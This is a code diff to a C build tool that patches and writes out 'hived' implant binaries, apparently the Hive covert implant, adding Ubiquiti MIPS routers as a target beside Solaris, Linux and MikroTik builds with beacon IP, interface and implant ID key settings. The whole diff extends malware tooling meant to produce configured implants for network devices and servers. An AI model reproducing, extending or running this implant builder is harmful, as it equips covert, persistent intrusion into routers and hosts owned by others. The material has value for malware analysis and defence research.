@@ -11,6 +11,7 @@
 #include <arpa/inet.h>
 #include <time.h>
 #include "trigger_protocols.h"
+
 #include "_unpatched_solaris_sparc.h"
 #include "_unpatched_solaris_x86.h"
 #include "_unpatched_linux_x86.h"
@@ -18,6 +19,7 @@
 #include "_unpatched_mikrotik_mips.h"
 #include "_unpatched_mikrotik_mipsel.h"
 #include "_unpatched_mikrotik_ppc.h"
+#include "_unpatched_ubiquiti_mips.h"
 
 #include "debug.h"
 #include "string_utils.h"
@@ -34,6 +36,7 @@
 #define HIVE_MIKROTIK_MIPS_FILE "hived-mikrotik-mips-PATCHED"
 #define HIVE_MIKROTIK_MIPSEL_FILE "hived-mikrotik-mipsel-PATCHED"
 #define HIVE_MIKROTIK_PPC_FILE "hived-mikrotik-ppc-PATCHED"
+#define HIVE_UBIQUITI_MIPS_FILE "hived-ubiquiti-mips-PATCHED"
 
 #define HIVE_SOLARIS_SPARC_UNPATCHED "hived-solaris-sparc-UNpatched"
 #define HIVE_SOLARIS_X86_UNPATCHED "hived-solaris-x86-UNpatched"
@@ -42,6 +45,7 @@
 #define HIVE_MIKROTIK_MIPS_UNPATCHED "hived-mikrotik-mips-UNpatched"
 #define HIVE_MIKROTIK_MIPSEL_UNPATCHED "hived-mikrotik-mipsel-UNpatched"
 #define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"
+#define HIVE_UBIQUITI_MIPS_UNPATCHED "hived-ubiquiti-mips-UNpatched"
 
 #define ID_KEY_FILE	"ID-keys.txt"
 #define ID_KEY_DATETIME_FORMAT	"%4i/%02i/%02i %02i:%02i:%02i"
@@ -123,6 +127,7 @@ int usage(char **argv)
 	fprintf(stdout, "                             * 'linux-x86'\n");
 	fprintf(stdout, "                             * 'sol-x86'\n");
 	fprintf(stdout, "                             * 'sol-sparc'\n");
+	fprintf(stdout, "                             * 'ub-mips'\n");
 	fprintf(stdout, "    %s[-h ]%s              - print this usage\n\n", GREEN, RESET);
 //   fprintf(stdout, "  %sExamples:%s\n", BLUE, RESET);
 //   fprintf( stdout, "   Coming soon!\n\n" );
@@ -159,6 +164,7 @@ int main(int argc, char **argv)
 	int mikrotik_mips = 0;						// MikroTik MIPS Big Endian
 	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
 	int mikrotik_ppc = 0;						// MikroTik PowerPC [Big Endian]
+	int ubiquiti_mips = 0;						// Ubiquiti MIPS Big Endian
 	int raw = 0;								// unpatched versions
 	char *host = (char *) NULL;					// cached hostname for user confirmation message
 	FILE *implantIDFile;						// Used to save implant keys and subsequent sha1 hashes...
@@ -338,6 +344,7 @@ int main(int argc, char **argv)
 				if (OPTMATCH(optarg, "linux-x86"))	{linux_x86 = 1;			break;}
 				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
 				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
+				if (OPTMATCH(optarg, "ub-mips"))	{ubiquiti_mips = 1;		break;}
 				if (OPTMATCH(optarg, "raw"))		{raw = 1;				break;}
 
 				if (OPTMATCH(optarg, "all"))		{solaris_sparc = 1,
@@ -346,7 +353,8 @@ int main(int argc, char **argv)
 													mikrotik_x86 = 1,
 													mikrotik_mips = 1,
 													mikrotik_mipsel = 1,
-													mikrotik_ppc = 1;		break;}
+													mikrotik_ppc = 1,
+													ubiquiti_mips = 1;		break;}
 				printf(" ERROR: Invalid architecture specified\n");
 				return -1;
 			} while (0);
@@ -396,7 +404,8 @@ int main(int argc, char **argv)
 			return -1;
 		}
 
-		if ((linux_x86 == 0) && (solaris_sparc == 0) && (solaris_x86 == 0) && (mikrotik_x86 == 0) && (mikrotik_mips == 0) && (mikrotik_ppc == 0) && (mikrotik_mipsel == 0)) {	// no OS was selected, so default is to build all
+		if (	(linux_x86 == 0) && (solaris_sparc == 0) && (solaris_x86 == 0) && (mikrotik_x86 == 0) &&
+				(mikrotik_mips == 0) && (mikrotik_ppc == 0) && (mikrotik_mipsel == 0) && (ubiquiti_mips == 0)) {	// no OS was selected, so default is to build all
 			solaris_sparc = 1;
 			linux_x86 = 1;
 			solaris_x86 = 1;
@@ -404,6 +413,7 @@ int main(int argc, char **argv)
 			mikrotik_mips = 1;
 			mikrotik_mipsel = 1;
 			mikrotik_ppc = 1;
+			ubiquiti_mips = 1;
 		}
 
 		if ((solaris_sparc == 1) || (solaris_x86 == 1)) {	// Solaris must have the interface patched in
@@ -469,6 +479,10 @@ int main(int argc, char **argv)
 		printf("   . MikroTik/PPC\n");
 	}
 
+	if (ubiquiti_mips == 1 || raw == 1) {
+		printf("   . Ubiquiti/MIPS\n");
+	}
+
 	if (raw == 0) {
 		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
 		cl_string((unsigned char *) args.iface, sizeof(args.iface));
@@ -481,6 +495,7 @@ int main(int argc, char **argv)
 	remove(HIVE_MIKROTIK_MIPS_FILE);
 	remove(HIVE_MIKROTIK_MIPSEL_FILE);
 	remove(HIVE_MIKROTIK_PPC_FILE);
+	remove(HIVE_UBIQUITI_MIPS_FILE);
 
 	remove(HIVE_SOLARIS_SPARC_UNPATCHED);
 	remove(HIVE_SOLARIS_X86_UNPATCHED);
@@ -489,6 +504,7 @@ int main(int argc, char **argv)
 	remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
 	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
 	remove(HIVE_MIKROTIK_PPC_UNPATCHED);
+	remove(HIVE_UBIQUITI_MIPS_UNPATCHED);
 
 
 	sleep(1);
@@ -504,6 +520,7 @@ int main(int argc, char **argv)
 		non_patch(HIVE_MIKROTIK_MIPSEL_UNPATCHED, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len);
 		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
 		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
+		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
 	}
 // We start as Little Endian.  If the binary is detected as Big Endian, then the structure
 // is changed to Big Endian.  Since these changes are made in a global variable used by all
@@ -531,6 +548,10 @@ int main(int argc, char **argv)
 
 	if (mikrotik_mips == 1) {
 		patch(HIVE_MIKROTIK_MIPS_FILE, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len, args);
+	}
+
+	if (ubiquiti_mips == 1) {
+		patch(HIVE_UBIQUITI_MIPS_FILE, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len, args);
 	}
 // beginning of big endian targets
 	if (solaris_sparc == 1) {
